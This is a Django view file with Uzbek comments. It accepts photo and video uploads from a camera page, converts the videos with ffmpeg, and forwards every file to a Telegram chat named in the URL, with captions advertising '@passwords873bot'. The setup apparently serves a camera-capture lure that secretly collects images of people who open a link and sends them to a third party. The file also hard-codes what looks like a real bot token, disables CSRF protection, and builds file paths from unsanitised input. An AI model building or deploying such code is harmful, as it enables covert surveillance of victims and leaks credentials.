import os
import uuid
import requests
import subprocess
from django.conf import settings
from django.http import JsonResponse
from django.views.decorators.csrf import csrf_exempt
from django.core.files.base import ContentFile
from django.shortcuts import render

TELEGRAM_BOT_TOKEN =  "7760257279:AAGgiolbiVaVv3hB1Dn3TvNGrz45WQq7UM4"


@csrf_exempt
def camera_view(request, id):

    if request.method == "GET":
        return render(request, "camera/index.html", {
            "MEDIA_URL": settings.MEDIA_URL
        })

    # ======= RASM QABUL QILISH =======
    if "image" in request.FILES:
        uploaded = request.FILES["image"]

        ext = uploaded.name.split(".")[-1]
        filename = f"{id}_{uuid.uuid4()}.{ext}"

        relative_path = f"saved_images/{filename}"                # <-- TO‘G‘RI YO‘L
        full_path = os.path.join(settings.MEDIA_ROOT, relative_path)

        # File saqlash
        with open(full_path, "wb") as f:
            for chunk in uploaded.chunks():
                f.write(chunk)

        # Telegramga yuborish
        try:
            url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendPhoto"
            with open(full_path, "rb") as f:
                requests.post(url, files={"photo": f}, data={
                    "chat_id": id,
                    "caption": "Rasm 📸\n\n@passwords873bot"
                }, timeout=20)
        except Exception as e:
            print("Telegram IMG xato:", e)

        return JsonResponse({"status": "ok", "file": filename})

    # ======= VIDEO QABUL QILISH =======
    if "video" in request.FILES:

        uploaded = request.FILES["video"]

        webm_name = f"{id}_{uuid.uuid4()}.webm"
        mp4_name = f"{id}_{uuid.uuid4()}.mp4"

        webm_rel = f"saved_videos/{webm_name}"
        mp4_rel = f"saved_videos/{mp4_name}"

        webm_path = os.path.join(settings.MEDIA_ROOT, webm_rel)
        mp4_path = os.path.join(settings.MEDIA_ROOT, mp4_rel)

        # webm saqlash
        with open(webm_path, "wb") as f:
            for chunk in uploaded.chunks():
                f.write(chunk)

        # ffmpeg convert
        try:
            subprocess.run([
                "ffmpeg", "-i", webm_path,
                "-c:v", "libx264", "-preset", "fast",
                "-c:a", "aac", "-b:a", "128k",
                "-y", mp4_path
            ], check=True)

            # Telegram video yuborish
            try:
                url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendVideo"
                with open(mp4_path, "rb") as f:
                    requests.post(url, files={"video": f}, data={
                        "chat_id": id,
                        "caption": "Video 🎥\n\n@passwords873bot"
                    }, timeout=60)
            except Exception as e:
                print("Telegram video xato:", e)

        except Exception as e:
            print("FFmpeg xato:", e)
            return JsonResponse({"status": "error", "msg": "convert xato"})

        return JsonResponse({"status": "ok", "file": mp4_name})

    return JsonResponse({"status": "error", "msg": "file topilmadi"})
